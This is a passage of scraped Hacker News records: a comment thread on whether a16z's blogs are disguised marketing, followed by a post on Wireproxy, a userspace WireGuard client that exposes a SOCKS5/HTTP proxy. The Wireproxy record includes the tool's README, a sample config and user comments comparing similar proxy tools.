\"longtermism\" is. It's \"we will amass huge amounts of capital to rule you now, because we know best, and we promise that as a result your (great-great-...)grandkids will have it better than if we hadn't\". It's just getting rich and playing with toys but with an ethical justification for it. It reminds me of how back in the day there was all sorts of Creative Bible scholarship around it being \"easier for a camel to fit through the eye of a needle than a rich man to enter heaven\". Like they were all \"actually the 'eye of the needle's is the name of this big gate in Jerusalem. It's super easy to get a camel through it!\" EA has done some neat stuff in the here and now in terms of looking at charities et al. But anything claiming to benefit the unborn trillions of the far, far future is just someone making excuses for themselves. reply fire_lake 2 hours agorootparent- I know what is good through utilitarian principles and my deep knowledge of science and Bayesian statistics - AI safety is an imminent threat and the best solution is to form an AI company and sell large amounts of stock to big tech - I’m super smart so I need to be the one to work on this - I need to earn loads of money so that I have the resources and focus to save humanity reply pokstad 7 hours agoparentprevWhat part is so bad? Care to quote? reply dools 7 hours agorootparentI have never heard of it, but I just had a quick skim through and IMHO the bad parts are the parts that have anything to do with economics, because it exposes him as a totalitarian neofeudalist (although he might not think of himself that way ... most totalitarian neofeudalists don't, they just don't understand their own economics well enough to see where it leads). reply bkirkby 6 hours agorootparenthow totalitarian? you have free markets (which the manifesto supports) or planned economies and planned economies are where totalitarianism works. reply defrost 6 hours agorootparentIs the US as it operates today a free market (how free?) or a weighted control economy where the larger players have a greater weight of control of media and the political landscape via owned outlets and subsidised senators? Do small players in the US economy have equal access to the market, or are they overshadowed by near oligarchies? Are you always so bicameral? reply corimaith 2 hours agorootparentHow would your \"ideal\" market then look like? I'm not getting what it \"means\" for small players to have equal access to the market than large players, of course greater resources will lend itself to greater reach. reply bkirkby 6 hours agorootparentprevthe \"control\" of a \"weighted control economy\" is usually enforced through government (including those politicians you reference). so when we bring in more government then it's less free market. how close we are getting to a free market depends on who is in power and calling for reduced government intervention/regulations for businesses. as far as control of media, traditional media is becoming increasingly irrelevant and when free speech is allowed on social media the economy becomes more free. and small players seem to disrupt all the time. openai being the most obvious recent example. twitch being another notable example before that. i usually don't respond to distracting personal questions, but your use of bicameral confused me a little. did you mean to say binary? reply TaylorAlexander 6 hours agorootparent> the \"control\" of a \"weighted control economy\" is usually enforced through government It is extremely common for large private firms to have weighted control in an economy. Sometimes their control is bolstered by government and sometimes it is hindered by it. But in a completely unregulated market it would be common for monopolies to pop up which could then control large sections of the economy. There simply is no simple linear relationship between \"free markets\" and government intervention. > when free speech is allowed on social media the economy becomes more free Sadly the loudest \"free speech proponents\" who run social media firms are actually just interested in allowing the speech they want. They will still do everything they can to limit the speech of those they disagree with. reply gryn 5 hours agorootparentprev> when we bring in more government then it's less free market. Let's go to the extreme with your logic. If you completely remove the government you end up with the mafia textbook. The easier way to win at the game is taking out the competition with lethal force. Once that's done there's no one to compete with you, no \"free market\", congratulations you won. Why compete in bringing value when you can just use your money to takeout the competition. reply defrost 5 hours agorootparentprevBicameral was used by Jaynes in the sense of distinct seperate chambers of the mind, rather than political chambers; I can't say I agreed with his thesis but I always enjoyed his argument and the apropriation of the word. > i usually don't respond to distracting personal questions These were specific questions to tease out why you're presenting free market OR planned economies as the only choices- it smacked of certain type of central north american libertarianism that uses Heinlein's early teen reader simplifications. OpenAi being described as a small player is laughable, small players don't appear with one billion US pledged in backing and sheperded by core established technocrats. BTW, the question was: \"Is the US as it operates today a free market?\" Do you have a clear answer there? reply TaylorAlexander 6 hours agorootparentprev> you have free markets ... or planned economies Believe it or not, humanity's economic markets cannot be fully described by two simple categories. reply dools 5 hours agorootparentprevIf one could have a \"free market\" in the sense that there were no state to begin with (which one can't) then you wind up with anarcho capitalism, in which a single entity wins because returns to capital accelerate. This single entity can then do whatever it likes. In reality, you start with a state and then have increasing regulatory capture by large private entities who turn the state into a system that exists purely to enforce their property rights. As they do so they eliminate public purpose. Whether you have planned totalitarianism or anarcho capitalist totalitarianism the result is the same. If you have 100% returns to either labour or capital, or you try to eliminate either public or private purpose, then you must have totalitarianism. The Techno-Optimist Manifesto imagines that you can have no state AND no regulatory capture, it's garbage. There are only 2 things in the economy: labour and capital. You have public purpose and private purpose. You balance those things, you have social democracy and innovation. You let it slip to any extreme and you're gonna have a bad time. reply nyokodo 5 hours agorootparent> anarcho capitalism, in which a single entity wins because returns to capital accelerate. This single entity can then do whatever it likes. You could have a natural monopoly form in anarcho-capitalism but unless they also grabbed a monopoly on the use of force and barred competition (basically became the state) then if they did abuse their monopoly position they would inevitably have competition arise even if it was required to route around whatever their monopoly was. reply dools 4 hours agorootparent> unless they also grabbed a monopoly on the use of force and barred competition (basically became the state) That's absolutely inevitable. That's why I call it feudalism. What you just described is like the middle ages with various independent scattered kingdoms, or like a collapsed state where rival warlords compete for control, with the occassional uprising. reply jrflowers 7 hours agorootparentprevThis is a good question. What differentiates his six thousand word manifesto from all of the totally normal six thousand word manifestos that are written by completely normal people on a daily basis? reply margalabargala 6 hours agorootparentConsidering that \"manifesto\" just means \"essay describing an opinion\", I don't think your repetition of the word is the indictment you intended. reply jrflowers 6 hours agorootparentExactly. Writing and publishing manifestos is a normal thing. Surely if you cannot link to your manifesto it is simply because you’ve yet to finish proofreading it reply vehementi 5 hours agorootparentI too am intensely distrustful of anyone expressing an opinion in more than a few paragraphs reply jrflowers 5 hours agorootparentThis is a good point. A manifesto is when you write more than a few paragraphs. The Cheesecake Factory menu is a manifesto, for example, and it is a baffling failure of diction that they do not call it that. reply svachalek 6 hours agorootparentprev> John Galt reply dboreham 7 hours agoparentpreva16z is not one person. reply threeseed 7 hours agorootparentThe manifesto is hosted on the main a16z website. So the obvious assumption is that Ben and the other leadership is supportive of it. reply dools 7 hours agorootparentIt's also signed Marc Andreesen: https://a16z.com/the-techno-optimist-manifesto/ Like he's the author of the post, at the top of the page. reply klabb3 2 hours agorootparentThis strengthens my theory that VC vocabulary consists almost exclusively of other people’s hot takes. I know only of two other groups of people who speak primarily in quotes: religious fundamentalists and teenagers during a brief fan-frenzy of some pop culture icon (eg Nirvana). reply laserlight 4 hours agorootparentprevWow. This is so bad that I can't take it seriously. reply __loam 7 hours agorootparentprevHis name is literally the a9 in a16z lmao. It's his venture capital firm. reply djangogitit 7 hours agoparentprevYoiks I hadn’t seen that and just googled it It’s funny how the better way is never “end aristocracy” and secure equality of condition Just more feudalism with the rich never fighting just betting reply bkirkby 6 hours agorootparentdid you mean to use a different word than \"aristocracy?\" and what is \"equality of condition\" and how do you achieve it? reply waihtis 4 hours agorootparentnext [3 more] [flagged] __loam 4 hours agorootparentYeah build that strawman bud. reply waihtis 3 hours agorootparentyour gaslighting doesn't really work when the original poster plucks their terminology straight from Das Kapital reply winter-day 7 hours agoprevMost things in america are paid ads in disguise: these posts, blogs by mckinsey/bcg/big 4 accounting firms, news is often a paid ad/agenda in disguise. You're honestly better off spending time with your family and developing a small hobby. ~ musings from a late 30s guy reply maigret 2 hours agoparentYou should read The Information Diet. Mostly agreeing with what you say but coming to a different conclusion of where to find better information. reply vmurthy 5 hours agoparentprevI'd argue that if you are really interested, you can follow a few academics and read up on their papers etc. Of course, that's a big undertaking but it's the only alternative I can think of given the incentives for pushing shit at us reply akvadrako 3 hours agorootparentThat's just subjecting yourself to more marketing. They're trying to sell you their theory and get you to cite it or even better fund the work. It's quite common to gloss over arguments or ignore data that don't support their cause. reply ilrwbwrkhv 7 hours agoparentprevOr using all of this and becoming massively wealthy. reply codersfocus 6 hours agorootparentI think you’re forgetting the ??? step reply ilrwbwrkhv 5 hours agorootparentJust ask Adam Neumann. reply apsurd 6 hours agorootparentprevthere's enough counter advice at this point to suggest against \"playing entrepreneur\" in favor of you know, getting stuff done. reply Barrin92 6 hours agorootparentprevif you want to get massively wealthy get a good CS education or just get business experience in the real world, these a16z blogs and podcasts are for what's appropriately been labeled Veblenian entrepreneurship, that is consuming entrepreneurship as a sort of cosplay lifestyle. reply ClassyJacket 6 hours agorootparentprevShit why didn't I think of that?? reply EAtmULFO 8 hours agoprevI'm not sure why the author takes such umbrage at A16Z promoting its own portfolio companies. It is their blog after all. reply defrost 6 hours agoparentBugger all umbrage: I have tremendous respect for a16z, a firm that helped pioneer the practice of working with and nurturing founders rather than forcing them out pre-IPO or minmaxing term sheets. more a call to be more transparent and less submarine: but to do so under the guise of being helpful and impartial is just plain silly. reply nabakin 7 hours agoparentprevI mean, I'm glad I know there's a bias in those blog posts now. Until this post, I didn't know a16z funded companies/projects let alone biased their posts toward them and I've read a few of their LLM blog posts. reply ajkjk 5 hours agoparentprevit's the lying reply anonylizard 7 hours agoparentprevYeah, and the quality of the 'marketing writing' is good and informative. Because A16z can afford high quality writing... These 'emerging stack' articles do promote their own companies, but are nevertheless useful for newcomers into a field, to quickly grasp the process and the players. If you don't like it, compile your own version. I've used some companies recommended in their data architecture and it worked very well. reply refulgentis 7 hours agorootparentHot take: I think the fact vector DBs are even a hot field with multiple competitors speaks to the bending of the branches due to VC weight, so to speak. These things take ~40 LOC and 3 hours to write yourself, they can process ~20 pages/seconds ms, locally, on devices from 3 years ago that fit in your pocket. Having it hosted is a massive privacy risk. Yet how many vector DBs as companies articles have we seen, and how many ONNX tutorials have we seen? reply dboreham 7 hours agorootparentAh the \"I could write that in a weekend and still go camping\" 1000X developer. reply refulgentis 7 hours agorootparenthttps://github.com/Telosnex/fonnx - note thats on 6, count em, 6 platforms, and I need to write 4 implementations (Swift/Kotlin/C++/JS). I'm not kidding. Maybe 4 hours. It's trivial. 93 lines of code. And its extremely rote. Allocate X input arrays. Call run. Pull out Y output arrays. Free. https://github.com/Telosnex/fonnx/blob/6d3d80be136002ae28ce2... reply mrcode007 7 hours agorootparentprevHe’s not wrong, you know ? reply ryanai 7 hours agoparentprevSince A16Z is famous, any bias advertisement can lead to monopolization and do damage to the production competition. Any kind of monopolization needs to get supervised. reply dmix 7 hours agorootparentMonopolization of what? Information? reply swyx 7 hours agorootparentprevsounds very close to saying speech should not be free if it influences people in any way. reply ryanai 7 hours agorootparentNot any way but some way, freedom is not always an excuse. This the reason why we need to have police man and why Zuck need to explain himself in the congress reply airstrike 6 hours agorootparentprevI think you mean \"unfair advantage\" rather than \"monopolization\", and the existence of former is much harder to argue reply ryanai 6 hours agorootparentThanks for pointing out that. Yes, but these unfair advantages can accumulate to become monopolization reply personjerry 7 hours agoprevHighly related: https://paulgraham.com/submarine.html reply cheeseface 6 hours agoparentThanks for sharing! A great read indeed. reply em500 1 hour agorootparentThe last part \"Online, the answer tends to be a lot simpler. Most people who publish online write what they write for the simple reason that they want to. You can't see the fingerprints of PR firms all over the articles, as you can in so many print publications-- which is one of the reasons, though they may not consciously realize it, that readers trust bloggers more than Business Week.\" is very dated though. Nowadays pretty much anything on Medium or Substack should probably be treated as ads or personal branding by default. reply geodel 5 hours agoprev> I have tremendous respect for a16z, a firm that helped pioneer the practice of working with and nurturing founders Maybe I am ignorant in thinking that by now everyone knows that they are just pump and dump operators. Even without financial implications lot of their blogs appear clueless about technology. They seem to target folks who may find Gartner quadrants too advanced. reply lebean 7 hours agoprevWow, articles about emerging technologies are pushed by people who invest in them? On their blog!? You don't say! reply irjustin 7 hours agoprevYou could take this to be true of so many news orgs that are too far left/right. Marketing for - conservative agenda, liberal agenda, gun ownership, gun safety, biden laptop, trump files. If you ask \"who is paying for this piece of writing\" many times you'll find a pretty clear slant. It's A16z's blog. What did you want them to do? reply aurareturn 6 hours agoprevA16z was/is the biggest pump and dump organization in crypto. reply fullshark 7 hours agoprevPhenomenon is hardly unique to A16Z reply discodave 7 hours agoparentYes, indeed HN is glorified marketing and networking for YC :) But I think a16z has spent a lot more time and money on their marketing efforts, especially as it relates to crypto. I for one am sick of hearing news stories, only to find that they're thinly veiled a16z marketing pitches for crypto scams. reply llm_nerd 7 hours agoparentprevIt isn't even unique to VCs or businesses. Most personal blogs are glorified marketing. Often it's people trying to establish their credibility in some domain. reply refulgentis 7 hours agoparentprevIf you define it widely as \"people writing about things they have a vested interest in\", maybe. In a16z's case they went out of their way to stand up media pipelines a few years back. reply davidu 7 hours agoprevWe're not one monolith of content. Folks post what they want and think is interesting. You can also imagine a lot of our portco CEOs don't love when we mention their competitors. Some of us do it more than others, depending on the topic or point of the post. Market maps do it a lot more than position pieces, as you'd expect, for instance. Anyways, the feedback is good. reply kaushalvivek 7 hours agoprevThis reminds me of Benn Stancil’s post — “The posters decide” Winners in the tech space are increasingly pre-determined by VC-influencer cos/ individuals, who create the buzz around products. https://benn.substack.com/p/the-posters-decide reply genmud 4 hours agoprevMost blogs are just glorified marketing, full stop. A blog that isn't marketing is the exception, not the rule. reply DISCURSIVE 6 hours agoprevYup. Back in time, they wrote an article about cloud repatriation (https://a16z.com/the-cost-of-cloud-a-trillion-dollar-paradox...) and used a very nich use cases to extrapolate to all the cloud workload just to support their own portfolio company. So many people in the industry just thought it was a joke:) reply Nicholas_C 7 hours agoprevhttps://en.m.wikipedia.org/wiki/Content_marketing reply discodave 7 hours agoprevThis post itself is glorified marketing. I don't know what to call it, something like 'title hacking'. I have no idea what the OPs company does, but I do agree with the title. reply jjtheblunt 7 hours agoprevThere's no glory in shameless self-serving propaganda. reply ajkjk 5 hours agoprevWhen I worked at a large-ish tech company it was very clear that their big PR pushes were coordinated with articles at major news sites like TechCrunch. It is all completely manufactured and disingenuous. reply curiousDog 7 hours agoprevI mean it's not like they're claiming to be Gartner..who by the way, gasp, do paid marketing for \"fair\" rankings. reply patrickhogan1 6 hours agoprevMarc is very specific about this. He had a whole post on it. reply asadalt 6 hours agoprevwell submarine! https://paulgraham.com/submarine.html reply niyogi 7 hours agoprevdefinitely marketing. they tried so hard to hype clubhouse. i think the experiment was to see if they could birth stars out of nothing only to learn it does not work that way. reply nemo44x 6 hours agoparentSounds like a worthy experiment. Why would people on this website condemn a group of people trying to see if a hunch is real? What have you done? reply herecomethefuzz 7 hours agoprevThe author is maybe too harsh but Milvus should be there for sure. reply hipadev23 7 hours agoprevJust wait til you read Sequoia’s deleted puff piece on SBF: https://web.archive.org/web/20221027181005/https://www.sequo... reply generativeai 7 hours agoprevFollow the money reply blackoil 6 hours agoprevIt can be sometime worse. During 2008 crisis many of Andreesan's posts for entrepreneurs were actually bad advice which were pro VCs. reply htrp 7 hours agoprevBlog from 6/20/2023 reply adamnemecek 8 hours agoprevSee are blogs in general as well as HN. reply adolph 7 hours agoprevWas there a question that they were ever anything else? reply andrewstuart 7 hours agoprevNothing surprising about that. Many blogs are. reply leptons 4 hours agoprev>A16Z just stop reply MrYellowP 2 hours agoprevPeople have grown shallow and mindless, not even recognizing that there is no substance behind many of the things they hear or read. Now some genius might respond with \"people have always been like this\" and that is likely true, but the scale nowadays is vastly different. The omnipresence/constant exposure is making it worse and, because parents aren't actually raising their kids anymore, there is no entity left to correct all this nonsense in the minds of the next generation. Or it's being outlawed doing so, of course. reply bburnett44 7 hours agoprevSomebody came to a conference that my company hosts and complained it was self promotion. Like yeah no shit. Feels like kinda the same thing here reply 23B1 7 hours agoprev\"Stung By Media Coverage, Silicon Valley Starts Its Own Publications\" - NPR 2021 https://www.npr.org/2021/06/25/1010066447/stung-by-media-cov... reply asdf6969 7 hours agoprevSo are McDonald’s posts. Why else would a venture capitalist firm have a blog? reply adolph 6 hours agoparentNo kidding, here is “Strangulating the monolith to a pluggable and scalable architecture” on Medium, which thinks so highly of it you have to sign in to read: https://medium.com/mcdonalds-technical-blog/strangulating-th... reply EGreg 7 hours agoprevThe VCs have their blogs to attract people - it’s lead generation nfx has good stuff about network effects avc talks about stuff from Fred Wilson’s point of view But my favorite is https://worldaftercapital.org by Albert Wenger, a partner at USV. Because it is clearly NOT about marketing and it’s about sharing his worldview. A venture capitalist talking about a post-capital world! reply Gimpei 6 hours agoprev [–] Is this an April fool’s joke? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The writer criticizes a16z's blogs for being promotional tools for their portfolio companies, highlighting biased information and overlooking competitors in the tech industry.",
      "They suggest that a16z prioritizes generating returns for their Limited Partners (LPs), raising concerns about the fairness and objectivity of their content.",
      "Emphasis is placed on the significance of transparency and honesty in sharing content, according to the writer's conclusion."
    ],
    "commentSummary": [
      "Discussion centers on VC-funded tech industry news potentially skewing media coverage towards marketing rather than substantive content.",
      "Topics include ethical implications of wealth, VC influence on markets, government intervention, and tech's economic impact.",
      "Debate covers risks of monopolies, balance of public and private interests, dangers of totalitarianism, trust in online content, and promotion of entrepreneurship by VC-funded tech media."
    ],
    "points": 224,
    "commentCount": 114,
    "retryCount": 0,
    "time": 1712020134
  },
  {
    "id": 39900329,
    "title": "Wireproxy: WireGuard client as HTTP/SOCKS5 proxy",
    "originLink": "https://github.com/pufferffish/wireproxy",
    "originBody": "wireproxy A wireguard client that exposes itself as a socks5/http proxy or tunnels. What is this wireproxy is a completely userspace application that connects to a wireguard peer, and exposes a socks5/http proxy or tunnels on the machine. This can be useful if you need to connect to certain sites via a wireguard peer, but can't be bothered to setup a new network interface for whatever reasons. Why you might want this You simply want to use wireguard as a way to proxy some traffic. You don't want root permission just to change wireguard settings. Currently, I'm running wireproxy connected to a wireguard server in another country, and configured my browser to use wireproxy for certain sites. It's pretty useful since wireproxy is completely isolated from my network interfaces, and I don't need root to configure anything. Users who want something similar but for Amnezia VPN can use this fork of wireproxy by @juev. Feature TCP static routing for client and server SOCKS5/HTTP proxy (currently only CONNECT is supported) TODO UDP Support in SOCKS5 UDP static routing Usage ./wireproxy -c [path to config] usage: wireproxy [-h|--help] [-c|--config \"\"] [-s|--silent] [-d|--daemon] [-v|--version] [-n|--configtest] Userspace wireguard client for proxying Arguments: -h --help Print help information -c --config Path of configuration file -s --silent Silent mode -d --daemon Make wireproxy run in background -v --version Print version -n --configtest Configtest mode. Only check the configuration file for validity. Build instruction git clone https://github.com/octeep/wireproxy cd wireproxy make Use with VPN Instructions for using wireproxy with Firefox container tabs and auto-start on MacOS can be found here. Sample config file # The [Interface] and [Peer] configurations follow the same semantics and meaning # of a wg-quick configuration. To understand what these fields mean, please refer to: # https://wiki.archlinux.org/title/WireGuard#Persistent_configuration # https://www.wireguard.com/#simple-network-interface [Interface] Address = 10.200.200.2/32 # The subnet should be /32 and /128 for IPv4 and v6 respectively # MTU = 1420 (optional) PrivateKey = uCTIK+56CPyCvwJxmU5dBfuyJvPuSXAq1FzHdnIxe1Q= DNS = 10.200.200.1 [Peer] PublicKey = QP+A67Z2UBrMgvNIdHv8gPel5URWNLS4B3ZQ2hQIZlg= # PresharedKey = UItQuvLsyh50ucXHfjF0bbR4IIpVBd74lwKc8uIPXXs= (optional) Endpoint = my.ddns.example.com:51820 # PersistentKeepalive = 25 (optional) # TCPClientTunnel is a tunnel listening on your machine, # and it forwards any TCP traffic received to the specified target via wireguard. # Flow: #--> localhost:25565 --(wireguard)--> play.cubecraft.net:25565 [TCPClientTunnel] BindAddress = 127.0.0.1:25565 Target = play.cubecraft.net:25565 # TCPServerTunnel is a tunnel listening on wireguard, # and it forwards any TCP traffic received to the specified target via local network. # Flow: #--(wireguard)--> 172.16.31.2:3422 --> localhost:25545 [TCPServerTunnel] ListenPort = 3422 Target = localhost:25545 # STDIOTunnel is a tunnel connecting the standard input and output of the wireproxy # process to the specified TCP target via wireguard. # This is especially useful to use wireproxy as a ProxyCommand parameter in openssh # For example: # ssh -o ProxyCommand='wireproxy -c myconfig.conf' ssh.myserver.net # Flow: # Piped command -->(wireguard)--> ssh.myserver.net:22 [STDIOTunnel] Target = ssh.myserver.net:22 # Socks5 creates a socks5 proxy on your LAN, and all traffic would be routed via wireguard. [Socks5] BindAddress = 127.0.0.1:25344 # Socks5 authentication parameters, specifying username and password enables # proxy authentication. #Username = ... # Avoid using spaces in the password field #Password = ... # http creates a http proxy on your LAN, and all traffic would be routed via wireguard. [http] BindAddress = 127.0.0.1:25345 # HTTP authentication parameters, specifying username and password enables # proxy authentication. #Username = ... # Avoid using spaces in the password field #Password = ... Alternatively, if you already have a wireguard config, you can import it in the wireproxy config file like this: WGConfig =# Same semantics as above [TCPClientTunnel] ... [TCPServerTunnel] ... [Socks5] ... Having multiple peers is also supported. AllowedIPs would need to be specified such that wireproxy would know which peer to forward to. [Interface] Address = 10.254.254.40/32 PrivateKey = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX= [Peer] Endpoint = 192.168.0.204:51820 PublicKey = YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY= AllowedIPs = 10.254.254.100/32 PersistentKeepalive = 25 [Peer] PublicKey = ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ= AllowedIPs = 10.254.254.1/32, fdee:1337:c000:d00d::1/128 Endpoint = 172.16.0.185:44044 PersistentKeepalive = 25 [TCPServerTunnel] ListenPort = 5000 Target = service-one.servicenet:5000 [TCPServerTunnel] ListenPort = 5001 Target = service-two.servicenet:5001 [TCPServerTunnel] ListenPort = 5080 Target = service-three.servicenet:80 Wireproxy can also allow peers to connect to it: [Interface] ListenPort = 5400 ... [Peer] PublicKey = YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY= AllowedIPs = 10.254.254.100/32 # Note there is no Endpoint defined here. Stargazers over time",
    "commentLink": "https://news.ycombinator.com/item?id=39900329",
    "commentBody": "Wireproxy: WireGuard client that exposes itself as a HTTP/SOCKS5 proxy (github.com/pufferffish)211 points by JNRowe 11 hours agohidepastfavorite36 comments nicoco 1 hour agohttps://github.com/dariost/soks works better for what I needed to do with wireguard. It does more or less the same thing but it reuses an existing wireguard interface. I detailed my use in this blog post https://www.nicoco.fr/blog/2023/09/10/wireguard/ (yes, shameless plug). reply lxgr 8 hours agoprevGreat little tool! I use it to selectively proxy Firefox tabs using multi-account containers to a home router that speaks Wireguard (but no application-layer proxying protocol or SSH). reply fransje26 2 hours agoparentWould you happen to have any good resources explaining how such a setup could be configured? reply k4rli 33 minutes agorootparentI've been using Sidebery and this for container specific proxy configuration and it works fine https://addons.mozilla.org/it/firefox/addon/container-proxy/ I had a socks server running in docker that turned Forticlient, the worst corporate vpn solution ever, into socks so then I could use access the internal urls in one container, still have fast internet elsewhere, and not expose my computer's entire network traffic to Forticrap. reply eptcyka 2 hours agoprevThere's also onetun. https://github.com/aramperes/onetun reply imiric 47 minutes agoprevNeat! If you want something like this specifically for Mullvad VPN, I've had a good experience with https://github.com/imiric/mullvad-proxy (not my project, just forked it for some updates). What I like is that it embeds the Mullvad CLI tool, so switching servers is trivial, and it's all isolated from the host machine. It's also \"just\" nginx and some scripts, so it should have good SOCKS5 support. reply chazeon 4 hours agoprevSeveral multi-protocol proxy clients support this functionality, some notable open-source examples include: - [sing-box](https://github.com/SagerNet/sing-box) - [clash-meta](https://github.com/muink/Clash.Meta) and other clash-based clients - [xray](https://github.com/xtls/xray-core) Close-sourced client include [Surge Mac/iOS](https://nssurge.com/). reply riedel 2 hours agoparentWas about to say this. Those multiprotocol proxies (presumably build to climb the Great Firewall) are an interesting microcosm. Tons of possibilities for obscure traffic routing. Also have android implementations. Used them just to open up a hotspot on a non hotspot SIM and non-rooted android a time ago. I am always wondering how trustworthy they are because they are packing tons of code taken from all over the net and have a quite interesting developer community for obvious reasons. reply dizhn 2 hours agoparentprevIn the closed-source world, cloudflare's warp can also work in proxy mode. Even the free accounts can work this way after converting the warp config to plain wireguard. reply rjzzleep 1 hour agoparentprevFor people that care, clash + v2ray seems to be the only thing that reliably works in China. While most big VPN providers claim that they work, they don’t. I haven’t spent a lot of time figuring out how it works, but I do like the concept of rule groups to decide which domains the vpn should proxy. reply vbezhenar 8 hours agoprevIs there completely userspace server implementation? Without tun/tap devices, etc. I guess some kind of userspace IP stack is necessary for that, although not sure. reply eclark 6 hours agoparenthttps://github.com/noisysockets/noisysockets With that, you can replace a Dialer in Go that connects sockets, effectively wrapping sockets with Wireguard. Since it does that in userspace, you get no tun/tap. This is all open-sourced by @dpeckett With those things, he also built a userspace wireguard gateway that includes DNS resolution. https://github.com/noisysockets/gateway https://news.ycombinator.com/user?id=dpeckett reply ignoramous 45 minutes agorootparentUpstream WireGuard (golang) has had this capability for a few years now: https://github.com/WireGuard/wireguard-go/tree/master/tun/ne... reply lxgr 8 hours agoparentprevIt's really completely in userspace and doesn't need any kernel modules or even superuser permissions for managing TUN/TAP devices (like e.g. OpenSSH's TUN device mode does)! It uses a userspace TCP/IP stack by Google, as far as I understand. reply yjftsjthsd-h 8 hours agoparentprevMaybe https://github.com/cloudflare/boringtun or https://github.com/WireGuard/wireguard-go ? reply lxgr 8 hours agorootparentI believe it uses the latter, but the missing piece is a userspace TCP/IP stack, since otherwise you'd need TUN device permissions to bridge over the impendence mismatch of sockets and IP packets containing TCP/UDP segments/datagrams. It uses gVisor for that. reply yjftsjthsd-h 8 hours agorootparentUgh, now this is driving me crazy. So I'm 99% sure that that exists, but I cannot for the life of me find the link. There's a CDN / edge compute company that gets published on HN semi-regularly that has this sweet client that... does a lot of things, but among them is connecting to your serverless containers by actually instantiating an entire TCP/IP stack in the application that's hooked up to the remote end over a wireguard proxy that's also in-application... Edit: FLY! https://news.ycombinator.com/item?id=30275905 reply hairyplanter 8 hours agoprevI was thinking “hey, I bet it would be pretty easy to write something like this in Go”. And of course it’s written in Go! reply poorman 6 hours agoprevNice! I was just thinking it would be sweet to have something like this to proxy all my Thunderbird email connections through my Tailscale exit node, without having to direct all my traffic through the exit node. reply nunez 6 hours agoparentYou can use the tailscale cli as a socks proxy. https://tailscale.com/kb/1113/aws-lambda If you slap that into a container image and expose the socks port tailscale listens on, bada bing, bada proxy! reply poorman 6 hours agorootparentOh I'll have to try that thanks! reply omgitsu 4 hours agoparentprevYou can also install 3proxy or squid proxy on the machine running the exit node and any machine that is on the tailnet can see use it reply mongol 4 hours agoprevI set up something similar using network namespaces with Wireguard and tinyproxy. But performance wasn't stellar. Interested how this performs. reply yjftsjthsd-h 8 hours agoprevHow's the performance? My memory is that \"vanilla\" SOCKS is really easy to do (just run ssh with the right option and tell your application to use it) but really slow. I suspect this is mostly for cases where you don't have a normal SOCKS/ssh server, but I'm curious if it offers a benefit there too. reply lxgr 8 hours agoparentWhat do you mean by \"vanilla\" SOCKS, i.e. as opposed to what other type of SOCKS implementation? For me, SOCKS over SSH has always been pretty performant, unlike e.g. OpenSSH's TUN mode (since that ends up doing TCP over TCP). reply yjftsjthsd-h 8 hours agorootparentBy vanilla, I mean `ssh -D`, as opposed to anything else that can offer a SOCKS port without actually transporting over ssh (ex. this project). Last time I compared, that was noticeably slower than wireguard, which yeah I attributed to TCP over TCP being kinda awful. reply lxgr 8 hours agorootparent`ssh -D` isn't TCP over TCP, though! It does multiplex multiple TCP sockets over a single underlying connection though, which can cause increased latency depending on how SSH schedules sends for each individual buffer. (Too fine-grained and you waste a lot of overhead on headers and framing; too coarse and you get head-of-line blocking.) There are also TCP fairness concerns: In a bottleneck, like a congested home Internet connection's uplink serving n total TCP connections, traffic generally splits equally across TCP flows; if you're multiplexing m SOCKS connections over one SSH connection, all those together seize only 1/n of the bottleneck capacity, i.e. each individual one gets 1/(m*n). An (UDP-based) VPN though would get 1/n of the bandwidth per tunneled TCP flow, i.e. m/n in total. In a way, `ssh -D` is a bit like HTTP/2 that way, while this tool is more like HTTP/3 / QUIC. reply rahimnathwani 4 hours agorootparentprevI'm curious why you refer to 'ssh -D' as 'vanilla SOCKS'? SOCKS existed before SSH did, and there are SOCKS server implementations that don't rely on SSH. reply yjftsjthsd-h 4 hours agorootparentAh, well that's quite simple: I'm dumb:) Or ignorant rather. But seriously, until reading your comment it never once occurred to me that it wasn't invented by (open)ssh; I assumed one of the \"S\"s stood for SSH (probably \"SOCKets over Ssh\"). And better yet, because that made sense, it never crossed my mind to question it. So, uh, thanks:) reply jaimehrubiks 6 hours agoparentprevIt would be great to compare both. Currently I connect to WireGuard and then create a socks proxy using SSH. And it works surprisingly well. But I'm very interested in this solution. reply Scarbutt 3 hours agoprevIsn't this already easily achievable with ssh? with 'ssh -D[port] foo@somehost' ssh will act as a SOCKS server. reply sjy 3 hours agoparentThat's fine if you control the endpoint and want to expose ssh on it, but WireGuard endpoints are also commonly available from VPN providers who don't provide shell access. reply JNRowe 3 hours agorootparentThat is the situation that lead to me to wireproxy; I had a need to use Cloudflare Warp, and no desire to entrust their apt repository with updates to my system. Added to that their official client has heaps of functionality I have no use for, and wireproxy does everything I want for this usecase with a comparatively tiny amount of code(5MB vs 400MB built). I started the evening with a wg-quick generated config that required root, and ended it using a simple unprivileged daemon that I can toggle easily. reply 99112000 9 hours agoprev [–] Does it support OpenVPN? reply russdill 9 hours agoparent [–] ... Um.. what? It's wireguard. It does the wireguard. Are you looking for tunsocks? reply lathiat 8 hours agorootparent [–] tunsocks would work, there also seems to be an openvpn fork with that functionality built in: https://github.com/bendlas/openvpn-tuna Otherwise you may be able to use SSH's SOCKS proxy mode if you can directly SSH, e.g. ssh -D 3128 user@host .. will listen on port 3128 as a SOCKS proxy. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Wireproxy is a userspace application connecting to a Wireguard peer, serving as a SOCKS5/HTTP proxy or tunnel without root permissions.",
      "It supports TCP static routing, UDP, multiple peers, and specific routing setups, enhancing flexibility and control over proxying traffic.",
      "Users can easily configure Wireproxy using a sample config file, making it a versatile tool for leveraging Wireguard for secure and efficient network communication."
    ],
    "commentSummary": [
      "Wireproxy is a WireGuard client acting as an HTTP/SOCKS5 proxy, enabling users to route internet traffic selectively through WireGuard connections.",
      "Users recommend different tools and setups for similar functions, discussing various proxy clients and VPN solutions.",
      "Praised for its user-friendly design and effectiveness, Wireproxy stands out as a favored option for directing specific network traffic through WireGuard connections."
    ],
    "points": 211,
    "commentCount": 36,
    "retryCount": 0,
    "time": 1712011889
  },
  {
    "id": 39902205,
